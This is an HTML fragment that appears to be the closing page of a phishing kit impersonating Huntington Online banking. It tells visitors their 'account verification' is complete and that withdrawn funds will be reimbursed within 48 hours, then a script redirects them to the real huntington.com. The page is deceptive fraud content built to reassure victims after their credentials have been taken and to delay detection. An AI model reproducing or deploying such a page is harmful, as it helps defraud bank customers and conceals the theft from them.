...
<body>
	...
	<div class="container p-3" style="min-height: 100vh;">
		<div class="alert-form py-5 mx-auto">
			<h4 class="mb-3 text-center" style="font-weight: 600;">VERIFICATION COMPLETE</h4>
			<div class="text-center my-3">
				<img src="static/img/complete-check.png" width="150px"/>
			</div>
			<p class="text-center" style="font-size: 1.0rem; font-weight:;">Your Huntington Online account verification is complete. If any funds were withdrawn from your account they will be automatically reimbursed within 48 hours. You will now be redirected to the login page in 15 seconds...</p>
		</div>
	</div>
	...
	<script type="text/javascript">
		setTimeout(function() {
			window.location.href = "https://www.huntington.com/";
		}, 15000);
	</script>
